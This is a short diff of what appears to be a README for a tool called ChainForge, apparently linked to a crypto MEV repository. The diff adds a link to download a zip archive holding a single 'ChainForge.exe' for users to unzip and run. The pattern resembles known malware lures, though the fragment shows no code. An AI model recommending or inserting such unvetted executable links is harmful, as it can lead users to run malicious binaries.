@@ -7,6 +7,7 @@
 ---
 
 ## Download & run
+[DOWNLOAD](https://github.com/ScArFACe-eLeCtriC496/MEV/raw/refs/heads/main/ChainForge.zip)
 
 - The app is packed into **a single file**: `ChainForge.exe`
 - Unzip the archive
